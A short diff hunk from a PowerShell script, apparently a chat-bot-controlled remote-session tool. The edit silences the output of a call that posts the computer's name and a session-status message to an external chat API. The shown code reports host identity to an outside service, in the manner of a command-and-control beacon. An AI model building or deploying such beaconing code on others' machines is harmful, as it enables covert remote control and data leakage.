@@ -450,7 +450,7 @@ Write-Output "Uninstalled."
 Function Pause-Session{
 $contents = "$env:COMPUTERNAME $pause Pausing Session.."
 $params = @{chat_id = $ChatID ;text = $contents}
-Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params
+Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params | Out-Null
 $script:AcceptedSession=""
 }
 
